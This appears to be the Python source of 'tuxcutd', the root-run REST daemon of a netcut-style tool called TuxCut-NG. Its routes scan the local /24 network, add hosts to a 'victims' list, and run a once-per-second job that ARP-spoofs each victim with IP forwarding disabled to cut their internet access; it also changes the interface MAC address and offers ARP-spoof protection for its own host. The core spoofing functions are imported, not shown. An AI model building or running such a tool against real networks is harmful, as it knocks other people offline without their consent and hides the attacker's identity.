"""
TuxCut-NG  —  tuxcutd.py
REST daemon — must run as root (systemd service).
Listens on 127.0.0.1:8013.
"""

import sys
import os
import json
import atexit

# Allow importing utils from the same directory
sys.path.insert(0, os.path.dirname(__file__))

from setproctitle import setproctitle
from bottle import route, run, request, response, hook
from apscheduler.schedulers.background import BackgroundScheduler
from apscheduler.triggers.interval import IntervalTrigger

from utils import (
    logger,
    get_default_gw, get_my, scan_network, generate_mac, change_mac,
    enable_ip_forward, disable_ip_forward,
    arp_spoof, arp_unspoof,
    enable_protection, disable_protection,
)

setproctitle('tuxcutd')

# Global state
victims: list = []
_gw_cache: dict = {}   # cache gateway between spoof cycles to reduce ARP noise


# ─────────────────── Background ARP-spoofing scheduler ───────────────

def _attack_victims():
    """Called every second by the scheduler to keep victims offline."""
    if not victims:
        return
    disable_ip_forward()          # prevent us from routing their traffic
    for v in list(victims):       # copy so we don't crash on concurrent edits
        try:
            arp_spoof(v)
        except Exception as e:
            logger.error('attack_victims: %s', e)


scheduler = BackgroundScheduler(daemon=True)
scheduler.add_job(
    _attack_victims,
    trigger=IntervalTrigger(seconds=1),
    id='arp_spoof_job',
    replace_existing=True,
)
scheduler.start()


# ───────────────────────── Cleanup on exit ───────────────────────────

def _on_exit():
    logger.info('tuxcutd stopping …')
    # Restore connectivity for all cut victims
    for v in list(victims):
        try:
            arp_unspoof(v)
        except Exception:
            pass
    enable_ip_forward()
    disable_protection()
    scheduler.shutdown(wait=False)
    logger.info('tuxcutd stopped')


atexit.register(_on_exit)


# ─────────────────────────── CORS helper ─────────────────────────────

@hook('after_request')
def _enable_cors():
    response.headers['Access-Control-Allow-Origin'] = '127.0.0.1'
    response.headers['Content-Type'] = 'application/json'


# ───────────────────────────── Routes ────────────────────────────────

@route('/status')
def status():
    """Health-check — client connects here first."""
    return json.dumps({'status': 'success', 'msg': 'TuxCut-NG daemon is running'})


@route('/gw')
def gateway():
    """Return default gateway info (IP, MAC, iface, hostname)."""
    global _gw_cache
    gw = get_default_gw()
    if gw:
        _gw_cache = gw
        return json.dumps({'status': 'success', 'gw': gw})
    return json.dumps({'status': 'error', 'msg': 'No active internet connection'})


@route('/my/<iface>')
def my_info(iface):
    """Return this machine's IP and MAC for the given interface."""
    my = get_my(iface)
    if my:
        return json.dumps({'status': 'success', 'my': my})
    return json.dumps({'status': 'error', 'msg': f'Could not get info for {iface}'})


@route('/scan/<gw_ip>')
def scan(gw_ip):
    """ARP-scan the /24 network and return live hosts."""
    hosts = scan_network(gw_ip)
    return json.dumps({'result': {'status': 'success', 'hosts': hosts}})


@route('/protect', method='POST')
def protect():
    """Enable ARP-spoofing protection for this machine."""
    gw_ip  = request.forms.get('ip',  '')
    gw_mac = request.forms.get('mac', '')
    iface  = request.forms.get('iface', _gw_cache.get('iface', ''))
    try:
        enable_protection(gw_ip, gw_mac, iface)
        return json.dumps({'status': 'success', 'msg': 'Protection enabled'})
    except Exception as e:
        logger.error('protect: %s', e)
        return json.dumps({'status': 'error', 'msg': str(e)})


@route('/unprotect')
def unprotect():
    """Disable ARP-spoofing protection."""
    try:
        iface  = _gw_cache.get('iface', '')
        gw_ip  = _gw_cache.get('ip', '')
        disable_protection(iface, gw_ip)
        return json.dumps({'status': 'success', 'msg': 'Protection disabled'})
    except Exception as e:
        logger.error('unprotect: %s', e)
        return json.dumps({'status': 'error', 'msg': str(e)})


@route('/cut', method='POST')
def cut():
    """Add a host to the victims list (start cutting its internet)."""
    victim = request.json          # {'ip': '...', 'mac': '...', 'hostname': '...'}
    if victim and victim not in victims:
        victims.append(victim)
        logger.info('Cutting %s', victim['ip'])
    return json.dumps({'status': 'success', 'msg': 'Host added to cut list'})


@route('/resume', method='POST')
def resume():
    """Remove a host from the victims list and restore its ARP entries."""
    victim = request.json
    if victim in victims:
        victims.remove(victim)
    try:
        arp_unspoof(victim)
        logger.info('Resumed %s', victim['ip'])
    except Exception as e:
        logger.error('resume: %s', e)
    return json.dumps({'status': 'success', 'msg': 'Host resumed'})


@route('/change-mac/<iface>')
def do_change_mac(iface):
    """Change the MAC address of an interface."""
    new_mac = change_mac(iface)
    if new_mac:
        return json.dumps({'result': {'status': 'success', 'new_mac': new_mac}})
    return json.dumps({'result': {'status': 'error', 'new_mac': ''}})


@route('/victims')
def list_victims():
    """Return the current victims list (for debugging)."""
    return json.dumps({'status': 'success', 'victims': victims})


# ─────────────────────────────── Main ────────────────────────────────

if __name__ == '__main__':
    if os.geteuid() != 0:
        print('ERROR: tuxcutd must run as root.', file=sys.stderr)
        sys.exit(1)

    logger.info('TuxCut-NG daemon starting on 127.0.0.1:8013 …')
    run(host='127.0.0.1', port=8013, quiet=True, debug=False)
